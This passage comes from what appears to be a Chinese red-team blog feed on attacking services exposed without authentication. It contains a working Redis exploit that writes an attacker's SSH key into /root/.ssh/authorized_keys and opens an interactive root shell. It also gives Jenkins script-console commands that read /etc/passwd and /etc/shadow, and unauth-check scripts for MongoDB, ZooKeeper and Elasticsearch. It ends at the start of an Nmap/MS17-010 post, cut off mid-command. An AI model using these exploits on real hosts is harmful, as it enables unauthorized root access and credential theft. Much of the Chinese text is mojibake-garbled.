keyword">try</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> socket_timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'/root/.ssh/'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : config set dir /root/.ssh/'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dbfilename'</span><span class="token punctuation">,</span> <span class="token string">'authorized_keys'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : config set dbfilename "authorized_keys"'</span><span class="token punctuation">)</span>    id_rsa_pub <span class="token operator">=</span> get_id_rsa_pub<span class="token punctuation">(</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'crackit'</span><span class="token punctuation">,</span> id_rsa_pub<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : set crackit'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : save'</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>from_private_key_file<span class="token punctuation">(</span>pkey<span class="token punctuation">)</span>    ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>    ssh<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ssh<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span> pkey<span class="token operator">=</span>key<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    ssh_stdin<span class="token punctuation">,</span> ssh_stdout<span class="token punctuation">,</span> ssh_stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>    content <span class="token operator">=</span> ssh_stdout<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> content<span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[ok] connect to &#123;&#125; : &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>      command <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'&#123;&#125; >>> '</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>      ssh_stdin<span class="token punctuation">,</span> ssh_stdout<span class="token punctuation">,</span> ssh_stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span>command<span class="token punctuation">)</span>      contents <span class="token operator">=</span> ssh_stdout<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> content <span class="token keyword">in</span> contents<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>  <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    error <span class="token operator">=</span> e<span class="token punctuation">.</span>args    <span class="token keyword">if</span> error <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      error <span class="token operator">=</span> <span class="token string">'save error'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] [&#123;&#125;] : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>error<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  shell_redis<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/04/01/UTbAUG0g.png"></p><h3 id="æ¸…ç©ºæ•°æ®åº“"><a href="#æ¸…ç©ºæ•°æ®åº“" class="headerlink" title="æ¸…ç©ºæ•°æ®åº“"></a>æ¸…ç©ºæ•°æ®åº“</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> FLUSHALLOK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å®‰è£…é…ç½®å¯å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.cnblogs.com/-mo-/p/11487797.html">https://www.cnblogs.com/-mo-/p/11487797.html</a></p><h2 id="0x02-Jenkins"><a href="#0x02-Jenkins" class="headerlink" title="0x02 Jenkins"></a>0x02 Jenkins</h2><p>é»˜è®¤æ˜¯8080ç«¯å£ æœªæˆæƒè®¿é—®å°±æ˜¯ä»»æ„ç”¨æˆ·éƒ½èƒ½è®¿é—® éƒ½èƒ½æ‰§è¡Œå‘½ä»¤</p><p>127.0.0.1:8080/jenkins/manage</p><p>127.0.0.1:8080/jenkins/script</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">#å‘½ä»¤é›†åˆprintln <span class="token string">"whoami"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text#<span class="token class-name">Linux</span>println <span class="token string">"ifconfig -a"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textprintln <span class="token string">"cat /etc/passwd"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textprintln <span class="token string">"cat /etc/shadow"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text#<span class="token class-name">Windows</span>println <span class="token string">"ipconfig /all"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textdef sout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> serr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>def proc <span class="token operator">=</span> 'ipconfig'<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>proc<span class="token punctuation">.</span><span class="token function">consumeProcessOutput</span><span class="token punctuation">(</span>sout<span class="token punctuation">,</span> serr<span class="token punctuation">)</span>proc<span class="token punctuation">.</span><span class="token function">waitForOrKill</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>println <span class="token string">"out> $sout err>$serr"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¿›å…¥åå°"><a href="#è¿›å…¥åå°" class="headerlink" title="è¿›å…¥åå°"></a>è¿›å…¥åå°</h3><p><img src="https://imgtp.apqiang.com/2022/04/01/6gYytwSB.png"></p><h3 id="æ‰§è¡Œå‘½ä»¤"><a href="#æ‰§è¡Œå‘½ä»¤" class="headerlink" title="æ‰§è¡Œå‘½ä»¤"></a>æ‰§è¡Œå‘½ä»¤</h3><p><img src="https://imgtp.apqiang.com/2022/04/01/e6Gv868S.png"></p><p>ä¹Ÿå¯ä»¥æ·»åŠ Terminal Pluginæ’ä»¶</p><h2 id="0x03-MongoDB"><a href="#0x03-MongoDB" class="headerlink" title="0x03 MongoDB"></a>0x03 MongoDB</h2><p>é»˜è®¤ç«¯å£ï¼š27017</p><p>è„šæœ¬æ£€æµ‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token comment"># mongodbæœªæˆæƒæ£€æµ‹è„šæœ¬</span><span class="token comment"># usage: python3 mongodb_unauth.py ip port</span><span class="token comment"># é»˜è®¤ç«¯å£ 28017 å’Œ 27017</span><span class="token keyword">from</span> pymongo <span class="token keyword">import</span> MongoClient<span class="token keyword">import</span> sysip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>conn <span class="token operator">=</span> MongoClient<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> socketTimeoutMS<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token comment">#è¿æ¥MongoDB,å»¶æ—¶5ç§’</span>dbs <span class="token operator">=</span> conn<span class="token punctuation">.</span>database_names<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] -> &#123;&#125;:&#123;&#125; database_names : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> dbs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>error <span class="token operator">=</span> e<span class="token punctuation">.</span>args<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] -> &#123;&#125;:&#123;&#125; error : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-ZooKeeper"><a href="#0x04-ZooKeeper" class="headerlink" title="0x04 ZooKeeper"></a>0x04 ZooKeeper</h2><p>é»˜è®¤ç«¯å£ï¼š2181 2171</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> /<span class="token comment"># æŸ¥çœ‹æ‰€æœ‰èŠ‚ç‚¹</span>get /<span class="token comment">#è·å–æŸä¸ªèŠ‚ç‚¹ä¿¡æ¯</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è„šæœ¬æ£€æµ‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token comment"># python3 zookeeper_unauth.py IP 2181</span><span class="token keyword">from</span> kazoo<span class="token punctuation">.</span>client <span class="token keyword">import</span> KazooClient<span class="token keyword">import</span> sys<span class="token comment"># æ£€æµ‹æ˜¯å¦å­˜åœ¨æœªæˆæƒæ¼æ´</span><span class="token keyword">def</span> <span class="token function">check_zookeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>zk <span class="token operator">=</span> KazooClient<span class="token punctuation">(</span>hosts<span class="token operator">=</span><span class="token string">'&#123;&#125;:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>zk<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>childrens <span class="token operator">=</span> zk<span class="token punctuation">.</span>get_children<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>childrens<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] -> &#123;&#125;:&#123;&#125; &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> childrens<span class="token punctuation">)</span><span class="token punctuation">)</span>zk<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>zk<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span>error <span class="token operator">=</span> e<span class="token punctuation">.</span>args<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] error: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>port <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>check_zookeeper<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x05-Elasticsearch"><a href="#0x05-Elasticsearch" class="headerlink" title="0x05 Elasticsearch"></a>0x05 Elasticsearch</h2><p>é»˜è®¤ç«¯å£ï¼š9200</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:9200&#x2F;_plugin&#x2F;head&#x2F;webç®¡ç†ç•Œé¢http:&#x2F;&#x2F;localhost:9200&#x2F;_cat&#x2F;indiceshttp:&#x2F;&#x2F;localhost:9200&#x2F;_river&#x2F;_searchæŸ¥çœ‹æ•°æ®åº“æ•æ„Ÿä¿¡æ¯http:&#x2F;&#x2F;localhost:9200&#x2F;_nodesæŸ¥çœ‹èŠ‚ç‚¹æ•°æ®<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è„šæœ¬æ£€æµ‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token comment"># elasticsearchæœªæˆæƒæ£€æµ‹è„šæœ¬</span><span class="token comment"># usage: python3 elasticsearch_unauth.py ip port</span><span class="token comment"># é»˜è®¤ç«¯å£9200</span><span class="token comment"># http://localhost:9200/_plugin/head/ webç®¡ç†ç•Œé¢</span><span class="token comment"># http://localhost:9200/_cat/indices</span><span class="token comment"># http://localhost:9200/_river/_search æŸ¥çœ‹æ•°æ®åº“æ•æ„Ÿä¿¡æ¯</span><span class="token comment"># http://localhost:9200/_nodes æŸ¥çœ‹èŠ‚ç‚¹æ•°æ®</span><span class="token keyword">import</span> sys<span class="token keyword">from</span> elasticsearch <span class="token keyword">import</span> Elasticsearch<span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 9200</span><span class="token keyword">try</span><span class="token punctuation">:</span>    es <span class="token operator">=</span> Elasticsearch<span class="token punctuation">(</span><span class="token string">"&#123;&#125;:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment"># è¿æ¥Elasticsearch,å»¶æ—¶5ç§’</span>    es<span class="token punctuation">.</span>indices<span class="token punctuation">.</span>create<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">'unauth_text'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] æˆåŠŸè¿æ¥ ï¼š&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> æˆåŠŸåˆ›å»ºæµ‹è¯•èŠ‚ç‚¹unauth_text'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    es<span class="token punctuation">.</span>index<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">"unauth_text"</span><span class="token punctuation">,</span> doc_type<span class="token operator">=</span><span class="token string">"test-type"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"text"</span><span class="token punctuation">:</span> <span class="token string">"text"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> æˆåŠŸå¾€èŠ‚ç‚¹unauth_textæ’å…¥æ•°æ®'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    ret <span class="token operator">=</span> es<span class="token punctuation">.</span>get<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">"unauth_text"</span><span class="token punctuation">,</span> doc_type<span class="token operator">=</span><span class="token string">"test-type"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> æˆåŠŸè·å–èŠ‚ç‚¹unauth_textæ•°æ® : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">)</span>    es<span class="token punctuation">.</span>indices<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">'unauth_text'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> æ¸…é™¤æµ‹è¯•èŠ‚ç‚¹unauth_textæ•°æ®'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] &#123;&#125; -> å­˜åœ¨ElasticSearchæœªæˆæƒæ¼æ´'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'å°è¯•è·å–èŠ‚ç‚¹ä¿¡æ¯ï¼šâ†“'</span><span class="token punctuation">)</span>    text <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://&#123;&#125;:&#123;&#125;/_nodes'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>    nodes_total <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token string">'_nodes'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'total'</span><span class="token punctuation">]</span>    nodes <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span><span class="token string">'nodes'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] &#123;&#125; -> [&#123;&#125;] : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> nodes_total<span class="token punctuation">,</span> nodes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    error <span class="token operator">=</span> e<span class="token punctuation">.</span>args    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] -> &#123;&#125;  error : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x06-Memcached"><a href="#0x06-Memcached" class="headerlink" title="0x06 Memcached"></a>0x06 Memcached</h2><p>é»˜è®¤ç«¯å£ï¼š11211</p><p>æç¤ºè¿æ¥æˆåŠŸè¡¨ç¤ºå­˜åœ¨æ¼æ´</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">telnet <span class="token operator">&lt;</span>target<span class="token operator">></span> <span class="token number">11211</span> æˆ– <span class="token function">nc</span> -vv <span class="token operator">&lt;</span>target<span class="token operator">></span> <span class="token number">11211</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x07-Hadoop"><a href="#0x07-Hadoop" class="headerlink" title="0x07 Hadoop"></a>0x07 Hadoop</h2><h3 id="a-HDFS"><a href="#a-HDFS" class="headerlink" title="a) HDFS"></a>a) HDFS</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">NameNodeé»˜è®¤ç«¯å£ 50070DataNodeé»˜è®¤ç«¯å£ 50075httpfsé»˜è®¤ç«¯å£ 14000journalnodeé»˜è®¤ç«¯å£ 8480<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="b-YARNï¼ˆJobTrackerï¼‰"><a href="#b-YARNï¼ˆJobTrackerï¼‰" class="headerlink" title="b) YARNï¼ˆJobTrackerï¼‰"></a>b) YARNï¼ˆJobTrackerï¼‰</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">ResourceManageré»˜è®¤ç«¯å£ 8088JobTrackeré»˜è®¤ç«¯å£ 50030TaskTrackeré»˜è®¤ç«¯å£ 50060<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="c-Hue"><a href="#c-Hue" class="headerlink" title="c) Hue"></a>c) Hue</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">Hueé»˜è®¤ç«¯å£ 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="d-YARNï¼ˆJobTrackerï¼‰"><a href="#d-YARNï¼ˆJobTrackerï¼‰" class="headerlink" title="d) YARNï¼ˆJobTrackerï¼‰"></a>d) YARNï¼ˆJobTrackerï¼‰</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">masteré»˜è®¤ç«¯å£ 60010regionserveré»˜è®¤ç«¯å£ 60030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="e-hive-server2"><a href="#e-hive-server2" class="headerlink" title="e) hive-server2"></a>e) hive-server2</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">hive-server2é»˜è®¤ç«¯å£ 10000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="f-spark-jdbcserver"><a href="#f-spark-jdbcserver" class="headerlink" title="f) spark-jdbcserver"></a>f) spark-jdbcserver</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">spark-jdbcserveré»˜è®¤ç«¯å£ 10003<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x08-couchdb"><a href="#0x08-couchdb" class="headerlink" title="0x08 couchdb"></a>0x08 couchdb</h2><p>é»˜è®¤ç«¯å£5984</p><p>couchdbçš„é…ç½®é‡Œå°†bind_addressè®¾ç½®ä¸º0.0.0.0åˆ™å­˜åœ¨æœªæˆæƒè®¿é—®</p><h2 id="0x09-ldap"><a href="#0x09-ldap" class="headerlink" title="0x09 ldap"></a>0x09 ldap</h2><p>ä½¿ç”¨å·¥å…· ldap adminç›´æ¥è¿æ¥å³å¯</p><h2 id="è„šæœ¬åˆé›†"><a href="#è„šæœ¬åˆé›†" class="headerlink" title="è„šæœ¬åˆé›†"></a>è„šæœ¬åˆé›†</h2><p><a href="https://github.com/f1veT/VulScan/find/master">https://github.com/f1veT/VulScan/find/master</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> å¤–éƒ¨æ‰“ç‚¹ </tag>
            
            <tag> æœªæˆæƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸è§åº”ç”¨æ¼æ´æ‰«æ&amp;åˆ©ç”¨</title>
      <link href="/2022/03/29/chang-jian-lou-dong-sao-miao/"/>
      <url>/2022/03/29/chang-jian-lou-dong-sao-miao/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç« èŠ‚å†…å®¹ä¸ºNmapæ‰«æå¸¸è§æ¼æ–¹å¼ï¼Œmssqlclientå’Œms17-010è„šæœ¬çš„ä½¿ç”¨æ–¹æ³•ã€‚</p><p>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="Nmapæ‰«ææŠ€å·§"><a href="#Nmapæ‰«ææŠ€å·§" class="headerlink" title="Nmapæ‰«ææŠ€å·§"></a>Nmapæ‰«ææŠ€å·§</h2><ul><li>auth å¤„ç†èº«ä»½éªŒè¯</li><li>broadcast ç½‘ç»œå¹¿æ’­</li><li>brute æš´åŠ›ç ´è§£</li><li>default é»˜è®¤</li><li>discovery æœåŠ¡å‘ç°</li><li>dos æ‹’ç»æœåŠ¡</li><li>exploit æ¼æ´åˆ©ç”¨</li><li>external å¤–éƒ¨æ‰©å±•</li><li>fuzzer æ¨¡ç³Šæµ‹è¯•</li><li>intrusive æ‰«æå¯èƒ½é€ æˆä¸è‰¯åæœ</li><li>malware æ£€æµ‹åé¢</li><li>safe æ‰«æå±å®³è¾ƒå°</li><li>version ç‰ˆæœ¬è¯†åˆ«</li><li>vuln æ¼æ´æ£€æµ‹</li></ul><h3 id="é€šç”¨å‚æ•°-vuln"><a href="#é€šç”¨å‚æ•°-vuln" class="headerlink" title="é€šç”¨å‚æ•° -vuln"></a>é€šç”¨å‚æ•° -vuln</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap --script<span class="token operator">=</span>vuln <span class="token number">192.168</span>.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap --script<span class="token operator">=</span>smb-vuln-ms17-010 <span class="token 